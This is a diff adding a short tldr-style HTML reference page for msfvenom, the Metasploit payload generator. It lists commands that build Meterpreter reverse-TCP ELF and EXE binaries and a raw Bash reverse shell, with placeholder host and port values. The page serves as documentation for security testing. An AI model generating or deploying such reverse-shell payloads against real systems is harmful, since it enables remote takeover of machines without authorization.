@@ -1,0 +1,40 @@
+<h1 id="msfvenom">msfvenom</h1>
+
+<p>Manually generate payloads for metasploit.
+More information: <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom">https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom</a>.</p>
+
+<ul>
+  <li>List payloads:</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">msfvenom -l payloads</code></p>
+
+<ul>
+  <li>List formats:</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">msfvenom -l formats</code></p>
+
+<ul>
+  <li>Show payload options:</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">msfvenom -p </code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">payload</span><code class="language-plaintext highlighter-rouge"> --list-options</code></p>
+
+<ul>
+  <li>Create an ELF binary with a reverse TCP handler:</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=</code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">local_ip</span><code class="language-plaintext highlighter-rouge"> LPORT=</code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">local_port</span><code class="language-plaintext highlighter-rouge"> -f elf -o </code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">path/to/binary</span></p>
+
+<ul>
+  <li>Create an EXE binary with a reverse TCP handler:</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">local_ip</span><code class="language-plaintext highlighter-rouge"> LPORT=</code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">local_port</span><code class="language-plaintext highlighter-rouge"> -f exe -o </code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">path/to/binary.exe</span></p>
+
+<ul>
+  <li>Create a raw Bash with a reverse TCP handler:</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">msfvenom -p cmd/unix/reverse_bash LHOST=</code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">local_ip</span><code class="language-plaintext highlighter-rouge"> LPORT=</code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">local_port</span><code class="language-plaintext highlighter-rouge"> -f raw</code></p>
